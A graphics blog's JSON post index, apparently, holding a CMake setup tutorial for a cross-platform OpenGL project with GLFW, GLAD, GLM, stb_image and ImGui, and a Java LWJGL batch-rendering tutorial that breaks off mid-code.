[ { "title": "Creating a CMake Project for cross platform graphics programming with OpenGL", "url": "/posts/cmake-project-graphics-programming/", "categories": "Graphics", "tags": "opengl, cmake, tutorial, imgui", "date": "2022-06-17 13:00:00 +0100", "snippet": "A while back I found myself switching to Linux as my main development environment for college work. Up until that point I had been spending sporadic free time learning graphics programming on Windows using Visual Studio and wanted to port over some of my projects. I thought CMake would be the best route as it was extensively used by other graphics projects on Github and is well maintained.However, it took me quite a while to figure out how to get a project setup with all of my usual libraries (GLFW, GLM, ImGui, more). There was no clear tutorial I could find. Eventually I got it working and thought I’d take a stab at writing my own. If you’re not interested in reading how it works in detail, and just would like a project template, checkout this Github repository.PlanFor this tutorial I am imagining a hypothetical scenario where I want to start a new graphics programming project which I can run on both Linux and Windows. My project is going to use OpenGL for graphics and various other libraries: GLAD for modern OpenGL bindings ImGui for GUI GLFW for cross platform window management GLM for vector and matrix maths stb_image for texture loadingWith the information in this article (and perhaps a little more research) you should be able to understand how to add more of your own libraries, potentially setup a similar project for Vulkan, DirectX, Metal, etc and maybe even support MacOS and other platforms.Project StructureOur project structure is going to look like this:CMake-Graphics-Project├── CMakeLists.txt├── dependencies│   ├── glad│   ├── glfw│   ├── glm│   ├── imgui│   └── stb_image├── resources└── src └── Main.cppWe start off by creating our main project folder called CMake-Graphics-Project. We then also create a few subfolders: dependencies is where we will put the libraries for our project resources is where we will put resources like textures, shaders, etc src is where our source code will beFor now I will keep these folders empty, except for a Main.cpp file in src with the following contents:#include &amp;lt;iostream&amp;gt;int main(){ std::cout &amp;lt;&amp;lt; &quot;Hello World!&quot; &amp;lt;&amp;lt; std::endl;}Initial CMake SetupThe most important file of the initial setup is the CMakeLists.txt. This is the file which configures our CMake project. I will start by creating a simple one so that we can compile our test Main.cpp program while we have no dependencies or resources. Before we start you will need to install CMake and a C and C++ compiler (if you have Visual Studio installed on Windows you already have a compiler). If you are on Windows also make sure to tick to add CMake to PATH so that it can be used from the command line. Linux should do this automatically.With CMake installed we can check if it’s working from the command line like so:$ cmake --versioncmake version 3.23.2CMake suite maintained and supported by Kitware (kitware.com/cmake).Now that it’s working we can start writing our CMakeLists.txt. The first few lines of nearly every CMakeLists define the CMake minimum version and declare a project with a name. In this case we are naming it CMakeGraphicsProject but it could be anything you want:cmake_minimum_required(VERSION 3.3)project(CMakeGraphicsProject)On the next lines we are then going to define our C++ standard. To do this we use the CMake command set(&amp;lt;variable&amp;gt;, &amp;lt;value&amp;gt;) to set some builtin variables:# C++ Standardset(CMAKE_CXX_STANDARD 14)set(CMAKE_CXX_STANDARD_REQUIRED True)Finally we need to define an executable to compile our code (.cpp) and header files (.h) into. We can use a neat trick to gather all .cpp and .h files under ./src into one variable called source. Then we just need to add the source variable to the executable.# Set `source` variable to all .h and .cpp files in `src`file(GLOB_RECURSE source CONFIGURE_DEPENDS &quot;src/*.h&quot; &quot;src/*.cpp&quot;)add_executable(CMakeGraphicsProject ${source})That’s it for now. We should be able to build and run our simple project next.Initial CMake BuildingBefore we build our executable we need to do some more CMake setup. Create a folder called build, change directory into it and run cmake ../ from a commandline. On Linux I do this like so:$ mkdir build$ cd ./build$ cmake ../-- The C compiler identification is GNU 12.1.0-- The CXX compiler identification is GNU 12.1.0-- Detecting C compiler ABI info-- Detecting C compiler ABI info - done-- Check for working C compiler: /usr/bin/cc - skipped-- Detecting C compile features-- Detecting C compile features - done-- Detecting CXX compiler ABI info-- Detecting CXX compiler ABI info - done-- Check for working CXX compiler: /usr/bin/c++ - skipped-- Detecting CXX compile features-- Detecting CXX compile features - done-- Configuring done-- Generating done-- Build files have been written to: /home/hobbes/Documents/Graphics/CMake-Graphics-Project/buildThis is where things differ between Linux and Windows. On Windows you will now find a Visual Studio solution file (.sln) in the ./build folder which you can open in Visual Studio and use as normal (build, run, debug, etc) (remember to set the startup project to CMakeGraphicsProject before hitting run!). However on Linux we need to use one more command to build the executable.$ cmake --build ./[ 50%] Building CXX object CMakeFiles/CMakeGraphicsProject.dir/src/Main.cpp.o[100%] Linking CXX executable CMakeGraphicsProject[100%] Built target CMakeGraphicsProject$ ./CMakeGraphicsProjectHello World!Setting up for OpenGLSo far our CMake project will let us program C++ with standard libraries, but this means no OpenGL support. To include OpenGL headers in our project, we can use some built-in CMake features. Add the following lines just under the project(CMakeGraphicsProject) line of our CMakeLists.txt:# OpenGLset(OpenGL_GL_PREFERENCE GLVND)find_package(OpenGL REQUIRED)include_directories(src ${OPENGL_INCLUDE_DIRS})Then also add this line under the add_executable line:target_link_libraries(CMakeGraphicsProject ${OPENGL_LIBRARIES})These lines tell CMake to include and link basic built-in system OpenGL functionality. However, we still do not have modern OpenGL support nor an easy cross platform way to create a window. To get these working we are going to need to introduce two dependencies. GLAD for modern OpenGL bindings and GLFW for window management.Setting up GLADGLAD is a C library which provides bindings for modern OpenGL functionality. You can grab the latest version from the GLAD generator website. Just pick what version of OpenGL you want, hit “Generate”, and you should get a file called glad.zip. This ZIP should contain two folders: include and src.If you haven’t already, create a folder called glad under dependencies and place these two folders in there like so:dependencies └── glad ├── include └── srcNow that we’ve got our GLAD dependency, how do we add it to the main CMake project? We need to make a subproject. For all of our dependencies we are going to create a CMake subproject by placing a CMakeLists.txt file in each dependency’s folder. In this case we need to create /dependencies/glad/CMakeLists.txt:cmake_minimum_required(VERSION 3.3)project(Glad)add_library(glad include/glad/glad.h src/glad.c)target_include_directories(glad PUBLIC include/)Same as before we define our minimum cmake version and project name. However, we don’t want to build an executable for this project because it is meant to be a library. Therefore, we don’t add the source and header files in the same way we did before. We instead add a library (add_library) called glad with the header files and source files from the subfolders. Depending on if there are new updates to GLAD, your folder structure from the ZIP file will be different and you may need to change this line slightly.On the last line we specify include directories for the library glad.We have now created a CMake subproject for GLAD and just need to add it to our main CMakeLists.txt like so:cmake_minimum_required(VERSION 3.3)project(CMakeGraphicsProject)# OpenGLset(OpenGL_GL_PREFERENCE GLVND)find_package(OpenGL REQUIRED)include_directories(src ${OPENGL_INCLUDE_DIRS})# C++ Standardset(CMAKE_CXX_STANDARD 14)set(CMAKE_CXX_STANDARD_REQUIRED True)# Subprojectsadd_subdirectory(dependencies/glad)# Set `source` variable to all .h and .cpp files in `src`file(GLOB_RECURSE source CONFIGURE_DEPENDS &quot;src/*.h&quot; &quot;src/*.cpp&quot;)add_executable(CMakeGraphicsProject ${source})target_link_libraries(CMakeGraphicsProject ${OPENGL_LIBRARIES} glad) # &amp;lt;Added GLAD&amp;gt;Note that we add the add_subdirectory line and then update our target_link_libraries. The latter tells CMake what libraries to link into our final executable for CMakeGraphicsProject.Setting up GLFWFirst we need to download the latest version of GLFW. Same as before, we need to extract the zip file contents into our /dependencies/glfw folder so we end up with a structure like so:dependencies └── glfw ├── CMake │ └── modules ├── deps │ ├── glad │ ├── mingw │ └── vs2008 ├── docs │ └── html │ └── search ├── examples ├── include │ └── GLFW ├── src └── testsThis structure may look slightly different for you if GLFW changes, but it should be generally similar.Luckily for us, GLFW comes with an already configured CMakeLists.txt subproject file. Therefore, we just need to add the subproject to our main CMakeLists.txt and update our target_link_libraries:# Subprojectsadd_subdirectory(dependencies/glad)add_subdirectory(dependencies/glfw)...target_link_libraries(CMakeGraphicsProject ${OPENGL_LIBRARIES} glad glfw) # &amp;lt;Added GLFW&amp;gt;Building &amp;amp; RunningNow that we have GLAD and GLFW added to our project, we are going to want to modify our Main.cpp file to test them out. I am basing this test code off of the example code from GLFW’s documentation and have simply added code to initialise GLAD for testing as well:#include &amp;lt;glad/glad.h&amp;gt;#include &amp;lt;GLFW/glfw3.h&amp;gt;int main(void){ GLFWwindow *window; /* Initialize the library */ if (!glfwInit()) return -1; /* Create a windowed mode window and its OpenGL context */ window = glfwCreateWindow(640, 480, &quot;Hello World&quot;, NULL, NULL); if (!window) { glfwTerminate(); return -1; } /* Make the window&#39;s context current */ glfwMakeContextCurrent(window); /* Initialize GLAD */ if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress)) return -1; /* Loop until the user closes the window */ while (!glfwWindowShouldClose(window)) { /* Render here */ glClear(GL_COLOR_BUFFER_BIT); glClearColor(0.0f, 1.0f, 0.0f, 1.0f); /* Swap front and back buffers */ glfwSwapBuffers(window); /* Poll for and process events */ glfwPollEvents(); } glfwTerminate(); return 0;}Now we can build and run our project. On Windows we would do this within the VS solution, but on Linux I will use the same command as before:$ cmake --build ./build&amp;lt;This produces a large output as it builds our executable and the new libraries&amp;gt;$ ./build/CMakeGraphicsProjectIf all works correctly, when we run our executable a green GLFW window should appear, as seen above. If you get as far as building your executable without any issue, but when you run the program nothing happens then maybe try adding some debug print statements to make sure it’s not exiting early with a return -1!Our current CMake setup is enough to get started graphics programming with OpenGL, however when I am working on a project I tend to use a few more libraries so we are going to set those up next.Adding Extra LibrariesThe three last libraries I am going to add to this project are ImGui for easy GUI setup, stb_image for texture loading and GLM for mathematics. ImGui is significantly more complex to add to a CMake project so we are going to start with stb_image and GLM.Setting up stb_imagestb_image is a single header library for loading textures (png, jpg, etc) into memory for use with OpenGL. To start we need to download the stb_image.h header and setup a dependencies folder for it. The folder will have the following structure:stb_image ├── CMakeLists.txt ├── include │ └── stb_image.h └── stb_image_impl.cAs you can see I have added a file called stb_image_impl.c (stb_image implementation). This file simply includes the stb_image.h header and defines STB_IMAGE_IMPLEMENTATION so that we can build it as a static library using CMake:#define STB_IMAGE_IMPLEMENTATION#include &amp;lt;stb_image.h&amp;gt;Our CMakeLists.txt looks nearly identical to the one we created for GLAD because we once again just need to create a static library with .c and .h files:cmake_minimum_required(VERSION 3.3)project(STB_IMAGE)add_library(stb_image include/stb_image.h stb_image_impl.c)target_include_directories(stb_image PUBLIC include/)With the subproject dependency now created we just need to add it to our main CMakeLists.txt in the usual way:# Subprojectsadd_subdirectory(dependencies/glad)add_subdirectory(dependencies/glfw)add_subdirectory(dependencies/stb_image)...target_link_libraries(CMakeGraphicsProject ${OPENGL_LIBRARIES} glad glfw stb_image) # &amp;lt;Added stb_image&amp;gt;Setting up GLMGLM is a math library for OpenGL which implements various useful datastructures like vectors and matrices, as well as various operations for doing calculations using those datastructures. To get started we need to download the latest release ZIP from Github. GLM’s structure is nearly identical to GLFW’s and so the process for adding it to our CMake project is also basically the same.First we extract it to the folder dependencies/glm so that we get a structure like the following:glm ├── cmake │ └── glm ├── doc │ ├── api │ │ └── search │ ├── manual │ └── theme ├── glm │ ├── detail │ ├── ext │ ├── gtc │ ├── gtx │ └── simd ├── test │ ├── bug │ ├── cmake │ ├── core │ ├── ext │ ├── gtc │ ├── gtx │ └── perf └── utilThen since it already has a CMakeLists.txt subproject setup for us we just need to add it to our main CMakeLists.txt:# Subprojectsadd_subdirectory(dependencies/glad)add_subdirectory(dependencies/glfw)add_subdirectory(dependencies/stb_image)add_subdirectory(dependencies/glm)...target_link_libraries(CMakeGraphicsProject ${OPENGL_LIBRARIES} glad glfw stb_image glm) # &amp;lt;Added GLM&amp;gt;Setting up ImGuiImGui is a library that makes OpenGL GUI incredibly quick and easy to implement. It allows us to add all kinds of UI buttons, sliders, settings, etc with very few lines of code. It is highly configurable and works with a large number of graphics pipelines so it will take some fiddling to get it setup in our CMake project.As per usual, the first thing we need to do is head over to the ImGui Github releases page and download the latest release. At the time of writing there is no specific release ZIP, so you need to just download the source code ZIP. With it downloaded we need to extract the contents into dependencies/imgui so that we end up with a structure like so:imgui ├── backends │ └── vulkan ├── docs ├── examples │ ├── example_* ├── imconfig.h ├── imgui.cpp ├── imgui_demo.cpp ├── imgui_draw.cpp ├── imgui.h ├── imgui_internal.h ├── imgui_tables.cpp ├── imgui_widgets.cpp ├── imstb_rectpack.h ├── imstb_textedit.h ├── imstb_truetype.h ├── LICENSE.txt └── misc ├── cpp ├── debuggers ├── fonts ├── freetype ├── README.txt └── single_fileAs you can see, ImGui does not come with a CMakeLists.txt file and this is because it can support so many different platforms and graphics pipelines that they expect you to simply include the headers and source files that you need from it.Therefore, in our main CMakeLists.txt we are going to pull in various useful header files from ImGui for GLFW and OpenGL3 support, as well as general ImGui sources and headers. Just after where we define our C++ standard place the following:# ImGuiset(imgui-directory dependencies/imgui)set(imgui-source ${imgui-directory}/imconfig.h ${imgui-directory}/imgui.h ${imgui-directory}/imgui.cpp ${imgui-directory}/imgui_draw.cpp ${imgui-directory}/imgui_internal.h ${imgui-directory}/imgui_widgets.cpp ${imgui-directory}/imstb_rectpack.h ${imgui-directory}/imstb_textedit.h ${imgui-directory}/imstb_truetype.h ${imgui-directory}/imgui_tables.cpp ${imgui-directory}/imgui_demo.cpp ${imgui-directory}/backends/imgui_impl_glfw.cpp ${imgui-directory}/backends/imgui_impl_opengl3.cpp)This sets variables imgui-directory and imgui-source which we can then use like so:add_executable(CMakeGraphicsProject ${source} ${imgui-source})target_link_libraries(CMakeGraphicsProject ${OPENGL_LIBRARIES} glad glfw stb_image glm) # &amp;lt;Unchanged&amp;gt;target_include_directories(CMakeGraphicsProject PRIVATE ${imgui-directory}) # &amp;lt;Added this line&amp;gt;Now when we compile and link our executable it will pull in the ImGui .h and .cpp files shown above.Building &amp;amp; RunningAfter all of that configuring let’s try modifying Main.cpp to test out the new libraries we added. Here is a new Main.cpp which tries some vector math, loads an image, and renders the ImGui demo window inside our GLFW window:#include &quot;imgui.h&quot;#include &quot;imgui_internal.h&quot;#include &quot;backends/imgui_impl_glfw.h&quot;#include &quot;backends/imgui_impl_opengl3.h&quot;#include &amp;lt;glad/glad.h&amp;gt;#include &amp;lt;GLFW/glfw3.h&amp;gt;#include &amp;lt;glm/glm.hpp&amp;gt;#include &amp;lt;stb_image.h&amp;gt;#include &amp;lt;iostream&amp;gt;int main(void){ GLFWwindow *window; /* Initialize the library */ if (!glfwInit()) return -1; /* Create a windowed mode window and its OpenGL context */ window = glfwCreateWindow(640, 480, &quot;Hello World&quot;, NULL, NULL); if (!window) { glfwTerminate(); return -1; } /* Make the window&#39;s context current */ glfwMakeContextCurrent(window); /* Initialize GLAD */ if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress)) return -1; /* Vector Math */ glm::vec3 v1(1.0, 2.0, 3.0); glm::vec3 v2(10.0, 11.0, 2.0); glm::vec3 v = v1 + v2; std::cout &amp;lt;&amp;lt; &quot;Vector Result: &quot; &amp;lt;&amp;lt; v.x &amp;lt;&amp;lt; &quot; &quot; &amp;lt;&amp;lt; v.y &amp;lt;&amp;lt; &quot; &quot; &amp;lt;&amp;lt; v.z &amp;lt;&amp;lt; std::endl; /* Load an Image */ int w, h, nrChannels; unsigned char *image = stbi_load(&quot;/home/hobbes/Documents/Graphics/CMake-Graphics-Project/resources/test_image.png&quot;, &amp;amp;w, &amp;amp;h, &amp;amp;nrChannels, STBI_default); if (!image) return -1; std::cout &amp;lt;&amp;lt; &quot;Width: &quot; &amp;lt;&amp;lt; w &amp;lt;&amp;lt; &quot; | Height: &quot; &amp;lt;&amp;lt; h &amp;lt;&amp;lt; &quot; | Channels: &quot; &amp;lt;&amp;lt; nrChannels &amp;lt;&amp;lt; std::endl; /* Initialize ImGui */ IMGUI_CHECKVERSION(); ImGui::CreateContext(); ImGuiIO &amp;amp;io = ImGui::GetIO(); ImGui::StyleColorsDark(); ImGui_ImplGlfw_InitForOpenGL(window, true); ImGui_ImplOpenGL3_Init(&quot;#version 460 core&quot;); /* Loop until the user closes the window */ while (!glfwWindowShouldClose(window)) { /* ImGui Frame */ ImGui_ImplOpenGL3_NewFrame(); ImGui_ImplGlfw_NewFrame(); ImGui::NewFrame(); ImGui::ShowDemoWindow(); ImGui::Render(); /* Render here */ glClear(GL_COLOR_BUFFER_BIT); glClearColor(0.0f, 1.0f, 0.0f, 1.0f); /* ImGui Render */ ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData()); /* Swap front and back buffers */ glfwSwapBuffers(window); /* Poll for and process events */ glfwPollEvents(); } glfwTerminate(); return 0;}If everything goes as planned you should see the usual GLFW window with a demo ImGui window inside which you can mess around with, as well as some console output to show that GLM and stb_image are working.You might be wondering why I am using a global filepath for the .png image. We’ll discuss that now in the final section.ResourcesThe final piece of the puzzle to complete our CMake project is our resources folder. This folder sits in the top level of our project and is where I would put any textures, shaders, text files, json files, etc that I might want to use within my code. However, depending on where you use cmake to build your project, the executable will move around the place. This means that using relative file paths within the code will likely not work. To solve this issue, we want our resources folder to always end up in the same folder as the executable. This will allow us to use filepaths like “./resources/shaders/test.glsl” from within our code. But how do we do this?We could tell CMake to copy our resources folder to the executable output directory like so:# Copy Resourcesfile(COPY resources/ DESTINATION ${PROJECT_BINARY_DIR}/resources/)However, the issue with this approach is when you start having gigabytes of resources in your project it will eat up a lot of disk space. This started to happen to me recently so I came up with a better solution to create a symbolic link or symlink to the main resources folder and place it beside the executable. CMake does not have an easy way to do this but with a bit of searching I found:# Symlink Resourcesadd_custom_command(TARGET CMakeGraphicsProject PRE_BUILD COMMAND ${CMAKE_COMMAND} -E create_symlink ${CMAKE_CURRENT_SOURCE_DIR}/resources $&amp;lt;TARGET_FILE_DIR:CMakeGraphicsProject&amp;gt;/resources)A symlink is essentially a folder that points to another folder. They are enabled by default on both Windows and Linux. If you place this at the bottom of your CMakeLists.txt then instead of loading the texture in Main.cpp from /home/hobbes/Documents/Graphics/CMake-Graphics-Project/resources/test_image.png, you can just load it like so:unsigned char *image = stbi_load(&quot;./resources/test_image.png&quot;, &amp;amp;w, &amp;amp;h, &amp;amp;nrChannels, STBI_default);WrapAnd that’s it. We now have what I would consider a fully configured CMake project for cross platform graphics programming with OpenGL. I found it quite a headache when I initially tried to get a CMake project working for this purpose so if this guide was able to help you solve at least one problem you’ve been having then it was worth writing!If you would like to checkout the finished working version of this project it can be found on Github at this link. This version has a few extra files like a README and linux/windows setup scripts. It also has some extra CMake settings for address sanitizer and GLFW flags.Extra NotesIf you don’t want people to have to set the startup project in Visual Studio when they first build your project, you can set it automatically in CMake by adding the following anywhere in your CMakeLists.txt:# Visual Studio Startup Projectif(WIN32) set_property(DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR} PROPERTY VS_STARTUP_PROJECT CMakeGraphicsProject)endif()" }, { "title": "OpenGL Tutorial - Batch Rendering and Dynamic VBOs", "url": "/posts/opengl-tutorial-batch-rendering-and-dynamic-vbos/", "categories": "Old", "tags": "opengl, lwjgl, tutorial", "date": "2020-06-12 13:00:00 +0100", "snippet": "Hello and welcome to my second ever tutorial on computer graphics programming using OpenGL. My previous tutorials covered many of the basics of OpenGL such as VBOs, IBOs, Shaders and MVP Matrices by implementing them in a Mandelbrot Set Fractal application. In that tutorial series we only ended up drawing a single quad to the screen which we then applied our Mandelbrot Fragment Shader to. If you remember, when supplying our data to our VBO using glBufferData, we specified for it to use GL_STATIC_DRAW. This meant that whatever data we placed there would not be changed again in the future. This data being the vertex attributes of our vertices, which in our case was their position.As a result, we are unable to modify the position of our quad’s vertices on the fly. So to get around this when we wanted to “move” our quad, we instead moved the “camera” which we created. Meaning the original vertex positions of our quad never changed. This works great when all we have is one quad however what if you wanted to have multiple quads in the same Vertex Buffer and move them all in different directions independent of each other? That’s where dynamic vertex buffers and batch rendering comes into play.Draw CallsBefore we begin talking about Batch Rendering and making our Vertex Buffers dynamic we need to grasp the idea of a draw call. Once all of our various vertex attributes and indices are placed into their respective buffers on the GPU we then use the following function in our main loop to draw everything to the screen:GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0);(If you don’t understand the specific parameters of this function check out the mandelbrot tutorial part 1 or read about it on docs.gl)This function is called a “Draw Call” as we are telling the GPU to use the data we have given it to draw stuff to the screen. One way in which we could draw two quads with different positions would be to use multiple draw calls, moving our “camera” using an MVP Matrix in between like so (this code is incomplete but represents the idea):mvpmatrix.translate(0.5, 0);int mat4location = GL30.glGetUniformLocation(programID, &quot;u_MVP&quot;);GL30.glUniformMatrix4fv(mat4location, false, mvpmatrix);GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0);mvpmatrix.translate(-0.5, 0);int mat4location = GL30.glGetUniformLocation(programID, &quot;u_MVP&quot;);GL30.glUniformMatrix4fv(mat4location, false, mvpmatrix);GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0);This would in fact work. When we run such a program we should see two quads on our screen with different positions. What we are in fact actually doing is drawing the same quad twice, at two different camera positions. This works fine and all but I’m sure you can already think of some of the major limitations of this approach. For example we would never be able to color the two quads differently as they both are using the same shaders. Not only that, but using multiple Draw Calls is quite intensive on the GPU when you start to draw much more things. Therefore, it is best practicec to batch as much as possible together into a single draw call.Batch RenderingTo demonstrate how to implement batch rendering we are going to start a new project in which we render four quads together in one draw call with different positions each and also different colors. Just like in the Mandelbrot Tutorials I am going to be using LWJGL for my OpenGL bindings and therefore programming in Java. If you wish to follow along directly with this tutorial I wrote another on how to setup a project exactly like mine here. To get started I will create a file called Application.java and paste in the starter code from LWJGL’s starter page. If you’re wondering what this code does I once again already discussed it in part one of the Mandelbrot Tutorial Series.(Before writing any new OpenGL code I will simply set a few variables such as the window resolution to 480x480 as well as title to “Batch Rendering Tutorial”)To start we are going to define the positions of the vertices of our four quads in a simple float array:float[] vertices = new float[] { // Quad 1 - Top Left -0.75f, 0.75f, -0.75f, 0.25f, -0.25f, 0.25f, -0.25f, 0.75f, // Quad 2 - Bottom Left -0.75f, -0.25f, -0.75f, -0.75f, -0.25f, -0.75f, -0.25f, -0.25f, // Quad 3 - Bottom Right 0.25f, -0.25f, 0.25f, -0.75f, 0.75f, -0.75f, 0.75f, -0.25f, // Quad 4 - Top Right 0.25f, 0.75f, 0.25f, 0.25f, 0.75f, 0.25f, 0.75f, 0.75f};We then need to setup a VBO just like normal:// VBO (Vertex Buffer Object)FloatBuffer vboBuffer = BufferUtils.createFloatBuffer(vertices.length);for(float vertex : vertices) { vboBuffer.put(vertex);}vboBuffer.flip();// Pass data to GPUint positionElementCount = vertices.length / 16;int vboID = GL30.glGenBuffers();GL30.glBindBuffer(GL30.GL_ARRAY_BUFFER, vboID);GL30.glBufferData(GL30.GL_ARRAY_BUFFER, vboBuffer, GL30.GL_STATIC_DRAW);GL30.glVertexAttribPointer(0, positionElementCount, GL_FLOAT, false, positionElementCount * Float.BYTES, 0);GL30.glEnableVertexAttribArray(0);For our IBO we are going to need to specify indices for all four quads in our integer array like so:// Indicesint[] indices = new int[] { // Quad 1 0, 1, 2, 2, 3, 0, // Quad 2 4, 5, 6, 6, 7, 4, // Quad 3 8, 9, 10, 10, 11, 8, // Quad 4 12, 13, 14, 14, 15, 12};And then pass them to the GPU using an IBO same as normal again:// IBO (Index Buffer Object)IntBuffer iboBuffer = BufferUtils.createIntBuffer(indices.length);for(int index : indices) { iboBuffer.put(index);}iboBuffer.flip();// Pass data to GPUint iboID = GL30.glGenBuffers();GL30.glBindBuffer(GL30.GL_ELEMENT_ARRAY_BUFFER, iboID);GL30.glBufferData(GL30.GL_ELEMENT_ARRAY_BUFFER, iboBuffer, GL30.GL_STATIC_DRAW);Just to be sure that there is a default shader present we will create one ourselves:Application.java// Shadersint programID = GL30.glCreateProgram();int vertShaderObj = GL30.glCreateShader(GL30.GL_VERTEX_SHADER);int fragShaderObj = GL30.glCreateShader(GL30.GL_FRAGMENT_SHADER);String vertexShader = parseShaderFromFile(&quot;/shaders/vert.shader&quot;);GL30.glShaderSource(vertShaderObj, vertexShader);GL30.glCompileShader(vertShaderObj);String fragmentShader = parseShaderFromFile(&quot;/shaders/frag.shader&quot;);GL30.glShaderSource(fragShaderObj, fragmentShader);GL30.glCompileShader(fragShaderObj);GL30.glAttachShader(programID, vertShaderObj);GL30.glAttachShader(programID, fragShaderObj);GL30.glLinkProgram(programID);GL30.glValidateProgram(programID);GL30.glUseProgram(programID);/shaders/vert.shader#version 410 corelayout(location = 0) in vec2 position;void main() { gl_Position = vec4(position, 0.0f, 1.0f);}/shaders/frag.shader#version 410 corevoid main() { gl_FragColor = vec4(0.5f, 1.0f, 0.5, 1.0f);}This should give our quads a green tint. We can now add a draw call to our program and go ahead and run it:GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0);That’s it! We’ve batched together four separate quads into the one draw call. Each has their own unique vertex position attributes laid out in our vertices array and unique indices in our indices array. However, there are still quite a few problems with this implementation. How do we color the quads differently? They currently all use the same shader. How do we move the quads after their data has been sent to the GPU using a VBO? Our VBO is still specified as GL_STATIC_DRAW. That’s what we are going to cover next to make Batch Rendering work just the same as using multiple draw calls.Here is the source code for Application.java which we have written so far:import org.lwjgl.*;import org.lwjgl.glfw.*;import org.lwjgl.opengl.*;import org.lwjgl.system.*;import java.io.BufferedReader;import java.io.InputStreamReader;import java.nio.*;import static org.lwjgl.glfw.Callbacks.*;import static org.lwjgl.glfw.GLFW.*;import static org.lwjgl.opengl.GL11.*;import static org.lwjgl.system.MemoryStack.*;import static org.lwjgl.system.MemoryUtil.*;public class Application { // The window handle private long window; private static final int WINDOW_WIDTH = 960 / 2; private static final int WINDOW_HEIGHT = 960 / 2; public void run() { init(); loop(); // Free the window callbacks and destroy the window glfwFreeCallbacks(window); glfwDestroyWindow(window); // Terminate GLFW and free the error callback glfwTerminate(); glfwSetErrorCallback(null).free(); } private void init() { // Setup an error callback. The default implementation // will print the error message in System.err. GLFWErrorCallback.createPrint(System.err).set(); // Initialize GLFW. Most GLFW functions will not work before doing this. if ( !glfwInit() ) throw new IllegalStateException(&quot;Unable to initialize GLFW&quot;); // Configure GLFW glfwDefaultWindowHints(); // optional, the current window hints are already the default glfwWindowHint(GLFW_VISIBLE, GLFW_FALSE); // the window will stay hidden after creation glfwWindowHint(GLFW_RESIZABLE, GLFW_TRUE); // the window will be resizable // Create the window window = glfwCreateWindow(WINDOW_WIDTH, WINDOW_HEIGHT, &quot;Batch Rendering Tutorial&quot;, NULL, NULL); if ( window == NULL ) throw new RuntimeException(&quot;Failed to create the GLFW window&quot;); // Setup a key callback. It will be called every time a key is pressed, repeated or released. glfwSetKeyCallback(window, (window, key, scancode, action, mods) -&amp;gt; { if ( key == GLFW_KEY_ESCAPE &amp;amp;&amp;amp; action == GLFW_RELEASE ) glfwSetWindowShouldClose(window, true); // We will detect this in the rendering loop }); // Get the thread stack and push a new frame try ( MemoryStack stack = stackPush() ) { IntBuffer pWidth = stack.mallocInt(1); // int* IntBuffer pHeight = stack.mallocInt(1); // int* // Get the window size passed to glfwCreateWindow glfwGetWindowSize(window, pWidth, pHeight); // Get the resolution of the primary monitor GLFWVidMode vidmode = glfwGetVideoMode(glfwGetPrimaryMonitor()); // Center the window glfwSetWindowPos( window, (vidmode.width() - pWidth.get(0)) / 2, (vidmode.height() - pHeight.get(0)) / 2 ); } // the stack frame is popped automatically // Make the OpenGL context current glfwMakeContextCurrent(window); // Enable v-sync glfwSwapInterval(1); // Make the window visible glfwShowWindow(window); } private void loop() { // This line is critical for LWJGL&#39;s interoperation with GLFW&#39;s // OpenGL context, or any context that is managed externally. // LWJGL detects the context that is current in the current thread, // creates the GLCapabilities instance and makes the OpenGL // bindings available for use. GL.createCapabilities(); // Set the clear color glClearColor(1.0f, 0.0f, 0.0f, 0.0f); float[] vertices = new float[] { // Quad 1 - Top Left -0.75f, 0.75f, -0.75f, 0.25f, -0.25f, 0.25f, -0.25f, 0.75f, // Quad 2 - Bottom Left -0.75f, -0.25f, -0.75f, -0.75f, -0.25f, -0.75f, -0.25f, -0.25f, // Quad 3 - Bottom Right 0.25f, -0.25f, 0.25f, -0.75f, 0.75f, -0.75f, 0.75f, -0.25f, // Quad 4 - Top Right 0.25f, 0.75f, 0.25f, 0.25f, 0.75f, 0.25f, 0.75f, 0.75f }; // VBO (Vertex Buffer Object) FloatBuffer vboBuffer = BufferUtils.createFloatBuffer(vertices.length); for(float vertex : vertices) { vboBuffer.put(vertex); } vboBuffer.flip(); // Pass data to GPU int positionElementCount = vertices.length / 16; int vboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ARRAY_BUFFER, vboID); GL30.glBufferData(GL30.GL_ARRAY_BUFFER, vboBuffer, GL30.GL_STATIC_DRAW); GL30.glVertexAttribPointer(0, positionElementCount, GL_FLOAT, false, positionElementCount * Float.BYTES, 0); GL30.glEnableVertexAttribArray(0); // Indices int[] indices = new int[] { // Quad 1 0, 1, 2, 2, 3, 0, // Quad 2 4, 5, 6, 6, 7, 4, // Quad 3 8, 9, 10, 10, 11, 8, // Quad 4 12, 13, 14, 14, 15, 12 }; // IBO (Index Buffer Object) IntBuffer iboBuffer = BufferUtils.createIntBuffer(indices.length); for(int index : indices) { iboBuffer.put(index); } iboBuffer.flip(); // Pass data to GPU int iboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ELEMENT_ARRAY_BUFFER, iboID); GL30.glBufferData(GL30.GL_ELEMENT_ARRAY_BUFFER, iboBuffer, GL30.GL_STATIC_DRAW); // Shaders int programID = GL30.glCreateProgram(); int vertShaderObj = GL30.glCreateShader(GL30.GL_VERTEX_SHADER); int fragShaderObj = GL30.glCreateShader(GL30.GL_FRAGMENT_SHADER); String vertexShader = parseShaderFromFile(&quot;/shaders/vert.shader&quot;); GL30.glShaderSource(vertShaderObj, vertexShader); GL30.glCompileShader(vertShaderObj); String fragmentShader = parseShaderFromFile(&quot;/shaders/frag.shader&quot;); GL30.glShaderSource(fragShaderObj, fragmentShader); GL30.glCompileShader(fragShaderObj); GL30.glAttachShader(programID, vertShaderObj); GL30.glAttachShader(programID, fragShaderObj); GL30.glLinkProgram(programID); GL30.glValidateProgram(programID); GL30.glUseProgram(programID); // Run the rendering loop until the user has attempted to close // the window or has pressed the ESCAPE key. while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // 